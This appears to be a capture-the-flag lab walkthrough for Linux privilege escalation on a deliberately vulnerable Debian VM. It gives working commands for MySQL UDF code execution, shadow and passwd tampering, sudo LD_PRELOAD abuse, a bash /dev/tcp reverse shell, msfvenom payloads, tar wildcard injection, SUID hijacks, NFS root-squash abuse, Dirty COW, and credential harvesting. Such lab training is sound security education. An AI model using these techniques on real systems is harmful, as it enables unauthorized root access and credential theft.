# Linux PrivEsc

## Index

- [Linux PrivEsc](#linux-privesc)
  - [Index](#index)
  - [1. Connect to the vulnerable machine](#1-connect-to-the-vulnerable-machine)
  - [2. Service Exploits](#2-service-exploits)
  - [3. Weak File Permissions - Readable /etc/shadow](#3-weak-file-permissions---readable-etcshadow)
  - [4. Weak File Permissions - Writable /etc/shadow](#4-weak-file-permissions---writable-etcshadow)
  - [5. Weak File Permissions - Writable /etc/passwd](#5-weak-file-permissions---writable-etcpasswd)
  - [6. Sudo - Shell Escape Sequences](#6-sudo---shell-escape-sequences)
  - [7. Sudo - Environment Variables](#7-sudo---environment-variables)
  - [8. Cron Jobs - File Permissions](#8-cron-jobs---file-permissions)
  - [9. Cron Jobs - PATH Environment Variable](#9-cron-jobs---path-environment-variable)
  - [10. Cron Jobs - Wildcards](#10-cron-jobs---wildcards)
  - [11. SUID / SGID Executables - Known Exploits](#11-suid--sgid-executables---known-exploits)
  - [12. SUID / SGID Executables - Shared Object Injection](#12-suid--sgid-executables---shared-object-injection)
  - [13. SUID / SGID Executables - LD\_PRELOAD](#13-suid--sgid-executables---ld_preload)
  - [14. SUID / SGID Executables - Abusing Shell Features (#1)](#14-suid--sgid-executables---abusing-shell-features-1)
  - [15. SUID / SGID Executables - Abusing Shell Features (#2)](#15-suid--sgid-executables---abusing-shell-features-2)
  - [16. Passwords \& Keys - History Files](#16-passwords--keys---history-files)
  - [17. Passwords \& Keys - Config Files](#17-passwords--keys---config-files)
  - [18. Passwords \& Keys - SSH Keys](#18-passwords--keys---ssh-keys)
  - [19. NFS](#19-nfs)
  - [20. Kernel Exploits](#20-kernel-exploits)
  - [21. Privilege Escalation Scripts](#21-privilege-escalation-scripts)

## 1. Connect to the vulnerable machine

Connect to the machine using the credentials provided in the challenge description.

```bash
export IP=10.10.49.124 # Change this to the IP of the vulnerable machine
ssh -oHostKeyAlgorithms=+ssh-rsa user@$IP
```

## 2. Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:

```bash
cd /home/user/tools/mysql-udf
```

Compile the raptor_udf2.c exploit code using the following commands:

```bash
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

Connect to the MySQL service as the root user with a blank password:

```bash
mysql -u root
```

Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:

```sql
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:

```sql
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

## 3. Weak File Permissions - Readable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-readable:

```bash
ls -l /etc/shadow
```

View the contents of the /etc/shadow file:

```bash
cat /etc/shadow
```

Each line of the file represents a user. A user's password hash (if they have one) can be found between the first and second colons (:) of each line.

Save the root user's hash to a file called hash.txt on your Kali VM and use john the ripper to crack it. You may have to unzip /usr/share/wordlists/rockyou.txt.gz first and run the command using sudo depending on your version of Kali:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Switch to the root user, using the cracked password:

```bash
su root
```

## 4. Weak File Permissions - Writable /etc/shadow

The /etc/shadow file contains user password hashes and is usually readable only by the root user.

Note that the /etc/shadow file on the VM is world-writable:

```bash
ls -l /etc/shadow
```

Generate a new password hash with a password of your choice:

```bash
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

```bash
su root
```

## 5. Weak File Permissions - Writable /etc/passwd

The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.

Note that the /etc/passwd file is world-writable:

```bash
ls -l /etc/passwd
```

Generate a new password hash with a password of your choice:

```bash
openssl passwd newpasswordhere
```

Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").

Switch to the root user, using the new password:

```bash
su root
```

Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").

Now switch to the newroot user, using the new password:

```bash
su newroot
```

## 6. Sudo - Shell Escape Sequences

List the programs which sudo allows your user to run:

```bash
sudo -l
```

Visit GTFOBins ([https://gtfobins.github.io](https://gtfobins.github.io)) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.

Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.

For an extra challenge, try to gain a root shell using all the programs on the list!

## 7. Sudo - Environment Variables

Sudo can be configured to inherit certain environment variables from the user's environment.

Check which environment variables are inherited (look for the env_keep options):

```bash
sudo -l
```

LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD loads a shared object before any others when a program is run. LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.

Create a shared object using the code located at /home/user/tools/sudo/preload.c:

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```

Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object:

```bash
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```

A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well.

Run ldd against the apache2 program file to see which shared libraries are used by the program:

```bash
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c:

```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object):

```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. Did it work? If not, try to figure out why not, and how the library_path.c code could be changed to make it work.

## 8. Cron Jobs - File Permissions

Cron jobs are programs or scripts which users can schedule to run at specific times or intervals. Cron table files (crontabs) store the configuration for cron jobs. The system-wide crontab is located at /etc/crontab.

View the contents of the system-wide crontab:

```bash
cat /etc/crontab
```

There should be two cron jobs scheduled to run every minute. One runs overwrite.sh, the other runs /usr/local/bin/compress.sh.

Locate the full path of the overwrite.sh file:

```bash
locate overwrite.sh
```

Note that the file is world-writable:

```bash
ls -l /usr/local/bin/overwrite.sh
```

Replace the contents of the overwrite.sh file with the following after changing the IP address to that of your Kali box.

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener. If it doesn't recheck the permissions of the file, is anything missing?

```bash
nc -nvlp 4444
```

Remember to exit out of the root shell and remove the reverse shell code before continuing!

## 9. Cron Jobs - PATH Environment Variable

View the contents of the system-wide crontab:

```bash
cat /etc/crontab
```

Note that the PATH variable starts with /home/user which is our user's home directory.

Create a file called overwrite.sh in your home directory with the following contents:

```bash
#!/bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
```

Make sure that the file is executable:

```bash
chmod +x /home/user/overwrite.sh
```

Wait for the cron job to run (should not take longer than a minute). Run the /tmp/rootbash command with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

## 10. Cron Jobs - Wildcards

View the contents of the other cron job script:

```bash
cat /usr/local/bin/compress.sh
```

Note that the tar command is being run with a wildcard (*) in your home directory.

Take a look at the GTFOBins page for tar. Note that tar has command line options that let you run other commands as part of a checkpoint feature.

Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf
```

Transfer the shell.elf file to /home/user/ on the Debian VM (you can use scp or host the file on a webserver on your Kali box and use wget). Make sure the file is executable:

```bash
chmod +x /home/user/shell.elf
```

Create these two files in /home/user:

```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.elf
```

When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames.

Set up a netcat listener on your Kali box on port 4444 and wait for the cron job to run (should not take longer than a minute). A root shell should connect back to your netcat listener.

```bash
nc -nvlp 4444
```

Remember to exit out of the root shell and delete all the files you created to prevent the cron job from executing again:

```bash
rm /home/user/shell.elf
rm /home/user/--checkpoint=1
rm /home/user/--checkpoint-action=exec=shell.elf
```

## 11. SUID / SGID Executables - Known Exploits

Find all the SUID/SGID executables on the Debian VM:

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

Note that /usr/sbin/exim-4.84-3 appears in the results. Try to find a known exploit for this version of exim. Exploit-DB, Google, and GitHub are good places to search!

A local privilege escalation exploit matching this version of exim exactly should be available. A copy can be found on the Debian VM at /home/user/tools/suid/exim/cve-2016-1531.sh.

Run the exploit script to gain a root shell:

```bash
/home/user/tools/suid/exim/cve-2016-1531.sh
```

## 12. SUID / SGID Executables - Shared Object Injection

The /usr/local/bin/suid-so SUID executable is vulnerable to shared object injection.

First, execute the file and note that currently it displays a progress bar before exiting:

```bash
/usr/local/bin/suid-so
```

Run strace on the file and search the output for open/access calls and for "no such file" errors:

```bash
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

Note that the executable tries to load the /home/user/.config/libcalc.so shared object within our home directory, but it cannot be found.

Create the .config directory for the libcalc.so file:

```bash
mkdir /home/user/.config
```

Example shared object code can be found at /home/user/tools/suid/libcalc.c. It simply spawns a Bash shell. Compile the code into a shared object at the location the suid-so executable was looking for it:

```bash
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

Execute the suid-so executable again, and note that this time, instead of a progress bar, we get a root shell.

```bash
/usr/local/bin/suid-so
```

## 13. SUID / SGID Executables - LD_PRELOAD

The /usr/local/bin/suid-env executable can be exploited due to it inheriting the user's PATH environment variable and attempting to execute programs without specifying an absolute path.

First, execute the file and note that it seems to be trying to start the apache2 webserver:

```bash
/usr/local/bin/suid-env
```

Run strings on the file to look for strings of printable characters:

```bash
strings /usr/local/bin/suid-env
```

One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however the full path of the executable (/usr/sbin/service) is not being used.

Compile the code located at /home/user/tools/suid/service.c into an executable called service. This code simply spawns a Bash shell:

```bash
gcc -o service /home/user/tools/suid/service.c
```

Prepend the current directory (or where the new service executable is located) to the PATH variable, and run the suid-env executable to gain a root shell:

```bash
PATH=.:$PATH /usr/local/bin/suid-env
```

## 14. SUID / SGID Executables - Abusing Shell Features (#1)

The /usr/local/bin/suid-env2 executable is identical to /usr/local/bin/suid-env except that it uses the absolute path of the service executable (/usr/sbin/service) to start the apache2 webserver.

Verify this with strings:

```bash
strings /usr/local/bin/suid-env2
```

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

Verify the version of Bash installed on the Debian VM is less than 4.2-048:

```bash
/bin/bash --version
```

Create a Bash function with the name "/usr/sbin/service" that executes a new Bash shell (using -p so permissions are preserved) and export the function:

```bash
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
```

Run the suid-env2 executable to gain a root shell:

```bash
/usr/local/bin/suid-env2
```

## 15. SUID / SGID Executables - Abusing Shell Features (#2)

Note: This will not work on Bash versions 4.4 and above.

When in debugging mode, Bash uses the environment variable PS4 to display an extra prompt for debugging statements.

Run the /usr/local/bin/suid-env2 executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```

Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:

```bash
/tmp/rootbash -p
```

Remember to remove the /tmp/rootbash executable and exit out of the elevated shell before continuing as you will create this file again later in the room!

```bash
rm /tmp/rootbash
exit
```

## 16. Passwords & Keys - History Files

If a user accidentally types their password on the command line instead of into a password prompt, it may get recorded in a history file.

View the contents of all the hidden history files in the user's home directory:

```bash
cat ~/.*history | less
```

Note that the user has tried to connect to a MySQL server at some point, using the "root" username and a password submitted via the command line. Note that there is no space between the -p option and the password!

Switch to the root user, using the password:

```bash
su root
```

<details>
    <summary>User secret command</summary>

    ```bash
    mysql -h somehost.local -uroot -ppassword123
    ```

    The -h option specifies the host to connect to, -u specifies the username, and -p specifies the password. The password is specified after the -p option, with no space between the option and the password.

</details>


## 17. Passwords & Keys - Config Files

Config files often contain passwords in plaintext or other reversible formats.

List the contents of the user's home directory:

```bash
ls /home/user
```

Note the presence of a myvpn.ovpn config file. View the contents of the file:

```bash
cat /home/user/myvpn.ovpn
```

<details>
    <summary>Secret here</summary>

    ```bash
    /etc/openvpn/auth.txt:password123
    ```

</details>

The file should contain a reference to another location where the root user's credentials can be found. Switch to the root user, using the credentials:

```bash
su root
```

## 18. Passwords & Keys - SSH Keys

Sometimes users make backups of important files but fail to secure them with the correct permissions.

Look for hidden files & directories in the system root:

```bash
ls -la /
```

Note that there appears to be a hidden directory called .ssh. View the contents of the directory:

```bash
ls -l /.ssh
```

Note that there is a world-readable file called root_key. Further inspection of this file should indicate it is a private SSH key. The name of the file suggests it is for the root user.

Copy the key over to your Kali box (it's easier to just view the contents of the root_key file and copy/paste the key) and give it the correct permissions, otherwise your SSH client will refuse to use it:

```bash
chmod 600 root_key
```

Use the key to login to the Debian VM as the root account (note that due to the age of the box, some additional settings are required when using SSH):

```bash
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@$IP
```

## 19. NFS

NFS (Network File System) is a protocol that allows remote systems to mount file systems over a network.

Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.

Check the NFS share configuration on the Debian VM:

```bash
cat /etc/exports
```

Note that the /tmp share has root squashing disabled.

On your Kali box, switch to your root user if you are not already running as root:

```bash
sudo su
```

Using Kali's root user, create a mount point on your Kali box and mount the /tmp share (update the IP accordingly):

```bash
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.10.10:/tmp /tmp/nfs
```

Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

```bash
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

Still using Kali's root user, make the file executable and set the SUID permission:

```bash
chmod +xs /tmp/nfs/shell.elf
```

Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

```bash
/tmp/shell.elf
```

## 20. Kernel Exploits

Kernel exploits can leave the system in an unstable state, which is why you should only run them as a last resort.

Run the **Linux Exploit Suggester 2** tool to identify potential kernel exploits on the current system:

```bash
perl /home/user/tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

The popular Linux kernel exploit "Dirty COW" should be listed. Exploit code for Dirty COW can be found at **/home/user/tools/kernel-exploits/dirtycow/c0w.c**. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).

Compile the code and run it (note that it may take several minutes to complete):

```bash
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
```

Once the exploit completes, run /usr/bin/passwd to gain a root shell:

```bash
/usr/bin/passwd
```

## 21. Privilege Escalation Scripts

Several tools have been written which help find potential privilege escalations on Linux. Check the **[tools/](tools/)** directory for a list of toothesels.
